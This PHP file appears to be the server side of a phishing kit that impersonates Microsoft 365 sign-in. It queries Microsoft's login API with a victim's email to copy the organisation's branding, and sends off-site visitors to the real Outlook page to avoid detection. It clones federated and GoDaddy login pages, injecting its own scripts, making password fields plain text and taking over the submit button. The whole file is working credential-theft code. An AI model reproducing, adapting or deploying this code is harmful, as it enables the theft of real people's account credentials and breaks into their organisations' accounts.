<?php
session_start();
error_reporting(0);
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);

if($refData['host'] !== $_SERVER['HTTP_HOST']) {

  header("location: https://outlook.office365.com/");
}

require("common.php");

if($_GET['w'] == "fed" && !empty($_SESSION['FedPage'])){
    echo $_SESSION['FedPage'];
    exit;
}
if($_GET['w'] == "godadd" && !empty($_SESSION['Godad_Page'])){
    echo $_SESSION['Godad_Page'];
    exit;
}
$PageSettings = array();
$Login = $_POST['id'];



if (!filter_var($Login, FILTER_VALIDATE_EMAIL)) { 
    $PageSettings['TYPE'] = "Not";
    echo json_encode($PageSettings);
}
else{
$Hash = hash('md5', $Login);
$Cookie = dirname(__FILE__) . "/tmp/" . $Hash.".txt";


$base_url = "https://login.microsoftonline.com";
$url = "https://login.microsoftonline.com/";
$last_redirect_url = "";
$content = get_page_content($url, "", "", "http://www.google.com/", $last_redirect_url, $error, $Hash);
if ($content === FALSE) {
    die('Error occured. ' . $error);
}
// file_put_contents("tmp/Page_1.html", $content);
$res = preg_match('|"sCtx":"([^"]+)"|', $content, $matches);
$ctx = $matches[1];
$res = preg_match('|"apiCanary":"([^"]+)"|', $content, $matches);
$apiCanary = $matches[1];
$res = preg_match('|client-request-id=([^"]+)"|', $content, $matches);
$requestID = $matches[1];
$res = preg_match('|"hpgact":([^,]+),|', $content, $matches);
$hpgact = $matches[1];
$res = preg_match('|"hpgid":([^,]+),|', $content, $matches);
$hpgid = $matches[1];
$res = preg_match('|"sFT":"([^,]+)"|', $content, $matches);
$flowToken = $matches[1];
$res = preg_match('|"canary":"([^,]+)"|', $content, $matches);
$canary = $matches[1];
$useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
$referer = $last_redirect_url;

$payload = '{"username":"' . $Login . '","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":false,"isCookieBannerShown":false,"isFidoSupported":false,"originalRequest":"' . $ctx . '"}';
$url = "https://login.microsoftonline.com/common/GetCredentialType";
$custom_headers = array('canary: ' . $apiCanary, 'client-request-id: ' . $requestID, 'hpgact: ' . $hpgact, 'hpgid: ' . $hpgid, 'Origin: https://login.microsoftonline.com', 'X-Compress:null');
$content = get_page_content($url, $payload, $custom_headers, $referer, $last_redirect_url, $error, $Hash);
if ($content === FALSE) {
    die('Error occured. ' . $error);
}
// file_put_contents("tmp/Page_2.json", $content);

$JsonArrays = json_decode($content, true);
foreach ($JsonArrays as $key => $value) {
    if (is_array($value)) {
        foreach ($value as $key => $value) {
            if (is_array($value)) {
                foreach ($value as $key => $value) {
                    if (is_array($value)) {
                        foreach ($value as $key => $value) {
                            $all[$key] = $value;
                        }
                    } else {
                        $all[$key] = $value;
                    }
                }
            } else {
                $all[$key] = $value;
            }
        }
    } else {
        $all[$key] = $value;
    }
}



if (array_key_exists('FederationRedirectUrl', $all)) {
    $fedLink = $all['FederationRedirectUrl'];

    $_SESSION['redirect'] = $fedLink;
    
    if (strpos($fedLink, 'godaddy') != FALSE) {

            $PageSettings['TYPE'] = "GOdaddy";
            $GodadyFile= file_get_contents('Gdad.html');
            $GodadyFile = str_replace('email@godaddy.com',$Login , $GodadyFile);
            $_SESSION['Godad_Page']= $GodadyFile;
            
            // 

    } else {
        $fedsite = substr($fedLink, 0, strlen(implode('/', array_slice(explode('/', $fedLink), 0, 3))));
        $fedContent = file_get_contents($fedLink);

        if(strpos($fedContent, 'id="branding"') !== false ){
       
        $fedContent = str_replace('src="/', 'src="' . $fedsite . '/', $fedContent);
        $fedContent = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $fedContent);
        $fedContent = preg_replace('/<div id="noScript"[^>]*>(.*?)<\/div>/is', "", $fedContent);
        $fedContent = str_replace('</head>', '<script src="src/mp.js"></script></head>', $fedContent);
        $fedContent = str_replace('type="password"', 'type="text"', $fedContent);
        $fedContent = str_replace('</body>', '<script src="src/fed.js"></script></body>', $fedContent);
        $fedContent = preg_replace('/<span id="submitButton"[^>]*>(.*?)<\/span>/is', '<span id="submitButton" disabled="false" class="submit" tabindex="4" onclick="NE();">Sign in</span>', $fedContent);
        $fedContent = str_replace('position:static; width:100%; height:100%; z-index:100', 'display:none;', $fedContent);
        $fedContent = str_replace('id="branding"', 'id="branding" class="illustrationClass"', $fedContent);
        $fedContent = str_replace('href="/', 'href="' . $fedsite . '/', $fedContent);
        $fedContent = str_replace("src='/", "src='".$fedsite."/" , $fedContent);
        $fedContent = str_replace('url(', 'url(' . $fedsite, $fedContent);

        $_SESSION['FedPage']= $fedContent;
        $PageSettings['TYPE'] = "FED";
    
    }
    }
    


   
} else {

    if (array_key_exists("BannerLogo", $all)) {
        $PageSettings['TYPE'] = "Change";
        $PageSettings['LOGO'] = $all['BannerLogo'];
    }
    if (array_key_exists("Illustration", $all)) {
        $PageSettings['TYPE'] = "Change";
        $PageSettings['BG'] = $all['Illustration'];
    }
    if (array_key_exists("BackgroundColor", $all)) {
        $PageSettings['TYPE'] = "Change";
        $PageSettings['BGColor'] = $all['BackgroundColor'];
    }
}


echo json_encode($PageSettings);
@unlink($Cookie);

}